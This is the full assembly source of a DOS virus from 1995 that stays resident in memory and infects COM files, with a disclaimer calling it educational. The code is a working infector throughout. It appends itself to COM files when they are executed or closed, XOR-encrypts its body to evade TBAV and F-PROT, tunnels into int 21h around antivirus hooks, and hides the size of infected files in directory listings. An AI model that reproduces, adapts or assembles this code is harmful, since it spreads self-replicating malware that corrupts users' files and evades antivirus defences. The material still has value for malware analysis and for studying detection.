;
;	VIRUS08.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of COM files, encrypted with an
; XOR algorithm. It uses tunneling to install the int21h handler.
;
; The virus infects on both execute (4b00h) and close (3eh), and it
; disinfects on open (3dh) and extended open (6c00h). If an infected
; file is being touched with the directory functions (11h/12h/4eh/4fh),
; the virus  will stealth the filesize. Critical error handling is taken
; care of by hooking interrupt 24h. File attribute changes are done through
; SFT manipulation.
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus
ParagraphSize	equ	VirusSize / 10h + 2
TimeStamp	equ	10001b				; Stealth marker
VirusInterrupt	equ	7979h
VirusIdentifier	equ	'bA'

BeginVirus:
	jmp	EntryPoint

;---------------------------------------------------------------------
;	Start of encrypted section
;---------------------------------------------------------------------

BeginEncryptedSection:
	mov	ax,VirusInterrupt			; Check if in mem
	int	21h
	cmp	ax,VirusIdentifier
	je	AlreadyResident

	mov	ah,4ah					; Get size of mem
	mov	bx,0ffffh
	int	21h
	mov	ah,4ah					; Change size of mem
	sub	bx,ParagraphSize+1			; Make space for virus
	int	21h
	mov	ah,48h					; Allocate memory
	mov	bx,ParagraphSize
	int	21h
	sub	ax,10h					; Compensate org 100h
	mov	es,ax
	mov	di,100h
	lea	si,[bp+offset BeginVirus]
	mov	cx,VirusSize
	rep	movsb					; Copy virus to mem
	push	es
	pop	ds
	inc	byte ptr ds:[0f1h]			; Change block owner

	push	cs
	call	InstallInt21hHandler			; Jump to tunneler

AlreadyResident:
	mov	di,100h
	push	di					; Save di at 100h
	push	cs					; Make cs=ds=es
	push	cs
	pop	es
	pop	ds
	lea	si,[bp+OrgJump]
	movsw						; Copy first bytes
	movsw
	ret						; Return

;---------------------------------------------------------------------
;	Install int21h handler
;---------------------------------------------------------------------

InstallInt21hHandler:
	push	ds					; Jump to tunneler in
	mov	ax,offset @@next1			; new memory
	push	ax
	retf

@@next1:mov	ah,52h					; Get list of lists
	int	21h
	mov	ax,es:[bx-2]				; Get first MCB
	mov	OrigMcb,ax

	mov	ax,3521h				; Get int21
	int	21h
	mov	Int21o,bx
	mov	Int21s,es

	mov	al,01h					; Save int01
	int	21h
	push	bx					; on stack
	push	es

	mov	ah,25h					; Set int01
	mov	dx,offset Int01hHandler
	int	21h

	pushf						; Set trap flag
	pop	ax
	or	ah,1
	push	ax
	popf

	mov	ah,0bh					; Issue dos function
	pushf						; Simulate interrupt
	call	dword ptr Int21o			; for tracing

	pop	ds
	pop	dx

	pushf						; Get flags
	pop	ax
	test	ah,1					; Check trap flag
	pushf
	and	ah,0feh					; Turn off trap flag
	push	ax
	popf

	mov	ax,2501h				; Reset int01
	int	21h

	push	cs
	pop	ds

	popf
	jnz	@@next2

	mov	ah,25h
	mov	dx,offset Int21hHandler
	int	21h
@@next2:retf

Int01hHandler:
	mov	cs:OrigAx,ax				; Save registers
	mov	cs:OrigSi,si
	mov	cs:OrigCx,cx
	pop	si					; Get ip in si
	pop	ax					; cs in ax
	pop	cx					; flags in cx
	push	ds
	mov	ds,ax
	cmp	word ptr [si],05eBh			; Check if tbav
	jne	@@next1
	cmp	byte ptr [si+2],0eah			; Check if tbav
	jne	@@next1
	inc	si					; Skip tbav
	inc	si
@@next1:cmp	byte ptr [si],9ah			; Immediate interseg?
	je	@@next3
	cmp	byte ptr [si],0eah			; Immediate interseg?
	je	@@next3
	cmp	word ptr [si],0ff2eh			; opc prefix=cs?
	jne	@@next2
	cmp	byte ptr [si+2],1eh			; Direct interseg?
	je	@@next4
	cmp	byte ptr [si+2],2eh			; Direct interseg?
	je	@@next4
@@next2:pop	ds
	push	cx
	push	ax
	push	si
	db	0b8h
OrigAx	dw	?
	db	0beh
OrigSi	dw	?
	db	0b9h
OrigCx	dw	?
	iret
@@next3:push	si
	inc	si
	jmp	@@next5
@@next4:push	si
	mov	si,si[3]
@@next5:db	81h,7ch,02h				; cmp ds:si[2], mcb
OrigMcb	dw	?					; See if jmp is to dos
	jnb	@@next6
	push	ax
	mov	ax,si[0]				; Get offset address
	mov	cs:Int21o,ax
	mov	ax,si[2]				; Get segment address
	mov	cs:Int21s,ax
	mov	si[0],offset Int21hHandler		; Install int21 handler
	mov	si[2],cs
	pop	ax
	and	ch,0feh					; Clear trap flag
@@next6:pop	si
	jmp	@@next2

;---------------------------------------------------------------------
;	New int 21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ax,VirusInterrupt			; Return installation
	jne	@@next1
	mov	ax,VirusIdentifier
	iret
@@next1:cmp	ax,4b00h				; Execute?
	jne	@@next2
	jmp	InfectFileOnExecute
@@next2:cmp	ah,3eh					; Close?
	jne	@@next3
	jmp	InfectFileOnClose
@@next3:cmp	ah,3dh					; Open?
	jne	@@next4
	jmp	DisinfectFileOnOpen
@@next4:cmp	ax,6c00h				; Extended open?
	jne	@@next5
	jmp	DisinfectFileOnExtendedOpen
@@next5:cmp	ah,11h					; Stealth FCB
	je	StealthFindMatchingFileFCB
	cmp	ah,12h					; Stealth FCB
	je	StealthFindMatchingFileFCB
	cmp	ah,4eh					; Stealth Handle
	je	StealthFindMatchingFile
	cmp	ah,4fh					; Stealth Handle
	je	StealthFindMatchingFile

OldInt21h:
	db	0eah
Int21o	dw	?
Int21s	dw	?

;---------------------------------------------------------------------
;	FCB & Handle stealth (11h/12h & 4eh/4fh)
;---------------------------------------------------------------------

StealthFindMatchingFileFCB:				; 11h/12h
	pushf
	push	cs
	call	OldInt21h				; fake a call to old int handler
	or	al,al
	jnz	ErrorStealth

	pushf
	push	ax bx es				; dont destroy

	mov	ah,51h
	int	21h					; get psp addr
	mov	es,bx
	cmp	bx,es:[16h]				; dos calling?
	jne	SkipStealth

	mov	bx,dx
	mov	al,[bx]					; current drive, if al=ffh then ext.fcb
	push	ax
	mov	ah,2fh
	int	21h					; get dta addr. es:bx
	pop	ax
	inc	al					; if al=ffh => al=00
	jnz	@@next1					; if al=00 then it's an extended fcb
	add	bx,7					; skip dos-reserved and attribs...
@@next1:add	bx,3					; the byte diffrence between the offset
							; to the filesize using fcb/handles
	mov	ax,es:[bx+14h]				; ax=timestamp	(14h+3=17h ;)
	jmp	short DoStealth				; hide the size

StealthFindMatchingFile:				; 4e/4f
	pushf
	push	cs
	call	OldInt21h				; fake int call
	jc	ErrorStealth				; there was an error so don't stealth
							; (such as no files to find.. )
	pushf
	push	ax bx es				; save

	mov	ah,2fh
	int	21h					; get dta addr., es:bx points to it...

	mov	ax,es:[bx+16h]				; get time stamp

DoStealth:
	and	al,00011111b				; kill all but secs...
	xor	al,TimeStamp				; xor with our marker
	jnz	SkipStealth				; not ours :(

	cmp	word ptr es:[bx+1ah],VirusSize		; if fcb bx=bx+3
	jb	SkipStealth				; too small to be us...
	cmp	word ptr es:[bx+1ch],0			; if fcb bx=bx+3
	ja	SkipStealth				; too large for us...>64k

	sub	word ptr es:[bx+1ah],VirusSize		; decrease the filesize
	sbb	word ptr es:[bx+1ch],0			; (* WHY ?? - TU *)

SkipStealth:
	pop	es bx ax
	popf

ErrorStealth:						; if there was an error during int call
	retf	2

;---------------------------------------------------------------------
;	Infect on execute (4b00h)
;---------------------------------------------------------------------

InfectFileOnExecute:
	push	es bp ax bx cx si di ds dx

	mov	ax,3d00h				; open file
	pushf						; Simulate a int call
	push	cs					; cs, ip on the stack
	call	OldInt21h
	xchg	ax,bx

	mov	ah,3eh					; Close and infect!
	int	21h

	pop	dx ds di si cx bx ax bp es
	jmp	OldInt21h

;---------------------------------------------------------------------
;	Infect on close (3eh)
;---------------------------------------------------------------------

InfectFileOnClose:
	push	es bp ax bx cx si di ds dx

	call	InstallInt24hHandler			; install a critical error handler

	cmp	bx,4					; don't close null, aux and so
	jbe	@@next1

	call	CheckSFT				; es:di+20h points to file name
	add	di,28h					; es:di points to extension
	cmp	word ptr es:[di],'OC'
	jne	@@next1
	cmp	byte ptr es:[di+2],'M'			; es:di+2 points to 3rd char in extension
	je	@@next2
@@next1:jmp	@@skip

@@next2:mov	byte ptr es:[di-26h],2

	mov	ax,4200h				; seek tof
	xor	cx,cx
	cwd
	int	21h

	push	cs					; cs=ds
	pop	ds

	mov	ax,5700h				; get time/date
	int	21h
	mov	Time,cx
	mov	Date,dx

	mov	ah,3fh					; read first four bytes to OrgJump
	mov	cx,4
	mov	dx,offset ds:OrgJump
	int	21h

	cmp	word ptr ds:OrgJump,'ZM'		; check if .EXE file
	je	@@skip
	cmp	word ptr ds:OrgJump,'MZ'
	je	@@skip

	cmp	byte ptr ds:OrgJump+3,'@'		; dont reinfect!
	je	@@skip

	mov	ax,4202h				; go end of file, offset in dx:cx
	xor	cx,cx					; and return file size in dx:ax.
	xor	dx,dx
	int	21h

	cmp	ax,(0FFFFH-VirusSize)			; dont infect too big or
	jae	@@skip					; too small files
	cmp	ax,(VirusSize-100h)
	jb	@@skip

	add	ax,offset EntryPoint-103h		; calculate entry offset to jmp
	mov	word ptr ds:NewJump[1],ax		; move it [ax] to NewJump

@@loop:	mov	ah,2ch					; get random number and put Key
	int	21h
	or	dl,dl					; dl=0 - get another value!
	je	@@loop
	mov	ds:Key,dx

	mov	ax,08d00h				; copy entire virus to 8d00h:100h
	mov	es,ax
	mov	di,100h
	mov	si,di
	mov	cx,(VirusSize+1)/2
	rep	movsw
	push	es
	pop	ds
	xor	bp,bp					; and encrypt it there
	call	EncryptDecrypt

	mov	ah,40h					; write virus to file from position
	mov	cx,VirusSize
	mov	dx,offset BeginVirus
	int	21h

	push	cs					; cs=ds
	pop	ds

	mov	ax,4200h				; go to beginning of file
	xor	cx,cx
	cwd
	int	21h

	mov	ah,40h					; and write a new-jmp-construct
	mov	cx,4					; of 4 bytes (4byte=infection marker)
	mov	dx,offset NewJump
	int	21h

	mov	ax,5701h				;restore
	mov	dx,Date
	mov	cx,Time
	and	cl,11100000b				; zero sec's
	or	cl,TimeStamp				; mark with our infection marker
	int	21h

@@skip:	call	RemoveInt24hHandler			; Remove 24h handler

	pop	dx ds di si cx bx ax bp es

	jmp	OldInt21h

;---------------------------------------------------------------------
;	Disinfect on extended open (6c00h) & open (3dh)
;---------------------------------------------------------------------

DisinfectFileOnExtendedOpen:
	push	ax bx cx dx di si ds es			; Save all regs/segs

	cmp	dx,1
	jne	@@skip

	mov	ax,3d00h				; Open file...
	mov	dx,si					; Filename
	int	21h					; ...and disinfect!
	xchg	bx,ax

	mov	ah,3eh					; Close the file
	pushf
	push	cs
	call	OldInt21h

@@skip:	pop	es ds si di dx cx bx ax
	jmp	OldInt21h

DisinfectFileOnOpen:
	push	ax bx cx dx di si ds es			; Save all regs/segs

	call	InstallInt24hHandler			; Install 24h handler

	push	ds
	pop	es					; ds=es

	mov	cx,64					; Scan for dot which
	mov	di,dx					; seperates filename
	mov	al,'.'					; from extension
	cld						; Clear direction
	repne	scasb
	jne	@@next2

	cmp	word ptr ds:[di],'OC'
	je	@@next1
	cmp	word ptr ds:[di],'oc'
	jne	@@next2
@@next1:cmp	byte ptr ds:[di+2],'M'
	je	OpenComFile
	cmp	byte ptr ds:[di+2],'m'
	je	OpenComFile
@@next2:jmp	NoComOpened

OpenComFile:
	mov	ax,3d00h				; Open file
	pushf
	push	cs
	call	OldInt21h
	xchg	ax,bx

	call	CheckSFT
	mov	byte ptr es:[di+2],2			; Change SFT to r&w

	push	cs					; cs=ds=es
	pop	ds
	push	cs
	pop	es

	mov	ax,5700h				; Get time/date
	int	21h
	push	cx
	push	dx

	and	cl,00011111b				; Kill all but secs
	xor	cl,TimeStamp				; xor with our marker
	jne	CloseFile				; file not infected?

	mov	ah,3fh					; Read first bytes
	mov	cx,4
	mov	dx,offset ds:OrgJump
	int	21h

	cmp	byte ptr ds:OrgJump,0e9h		; First byte = jmp?
	jne	CloseFile

	cmp	byte ptr ds:OrgJump+3,'@'		; Fourth byte = '@'?
	jne	CloseFile

	mov	ax,4202h
	mov	cx,-1					; Seek location where
	mov	dx,-(EndVirus-OrgJump)			; bytes from orig
	int	21h					; file is

	mov	ah,3fh					; Read bytes
	mov	cx,4
	mov	dx,offset ds:OrgJump
	int	21h

	mov	ax,4200h				; Seek SOF
	xor	cx,cx
	xor	dx,dx
	int	21h

	mov	ah,40h					; Write the original
	mov	dx,offset OrgJump			; bytes to filetop
	mov	cx,4
	int	21h

	mov	ax,4202h				; Seek
	mov	cx,-1
	mov	dx,-VirusSize
	int	21h

	mov	ah,40h					; Truncate file
	xor	cx,cx
	int	21h

CloseFile:
	mov	ax,5701h				; Restore saved
	pop	dx					; date
	pop	cx					; and time
	int	21h

	mov	ah,3eh					; Close the file
	pushf
	push	cs
	call	OldInt21h

NoComOpened:
	call	RemoveInt24hHandler			; Remove 24h handler

	pop	es ds si di dx cx bx ax

	jmp	OldInt21h

;---------------------------------------------------------------------
;	Helper functions
;---------------------------------------------------------------------

CheckSFT:
	push	bx
	mov	ax,1220h				; Get job file table
	int	2fh					; for handle at es:di

	mov	ax,1216h				; Get system filetable
	mov	bl,byte ptr es:[di]			; for handle index
	int	2fh
	pop	bx
	ret

InstallInt24hHandler:
	push	ax ds
	mov	ax,9
	mov	ds,ax
	push	word ptr ds:[0]
	push	word ptr ds:[2]
	pop	word ptr cs:[Int24s]
	pop	word ptr cs:[Int24o]
	mov	word ptr ds:[0],offset Int24hHandler
	push	cs
	pop	word ptr ds:[02]
	pop	ds
	pop	ax
	ret

RemoveInt24hHandler:
	push	ax
	push	ds
	push	word ptr cs:[Int24o]
	mov	ax,9
	push	word ptr cs:[Int24s]
	mov	ds,ax
	pop	word ptr ds:[2]
	pop	word ptr ds:[0]
	pop	ds
	pop	ax
	ret

;---------------------------------------------------------------------
;	New int 24h handler
;---------------------------------------------------------------------

Int24hHandler:
	mov	al,3					; Returns no error
	iret

OldInt24h:
Int24o	dw	0
Int24s	dw	0

Time	dw	0
Date	dw	0

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	GetDelta
EncryptDecrypt:						; Put en/decryption
	mov	dx,word ptr ds:[bp+Key]			; routine here to
	lea	si,[bp+BeginEncryptedSection]		; fool TBAV/F-PROT
	mov	cx,(EndEncryptedSection-BeginEncryptedSection)/2
@@loop:	xor	word ptr ds:[si], dx			; Simple xor-loop
	inc	si					; encryption
	inc	si
	loop	@@loop
	ret
Key	dw	0					; en/decrypt value
GetDelta:
	pop	bp
	sub	bp,offset EncryptDecrypt		; Get delta offset
	call	EncryptDecrypt				; Decrypt virus
	jmp	BeginEncryptedSection

NewJump	db	0e9h,00h,00h,'@'			; New entry buffer
OrgJump	db	0cdh,20h,00h,00h			; 4 byte buffer

EndVirus:

end
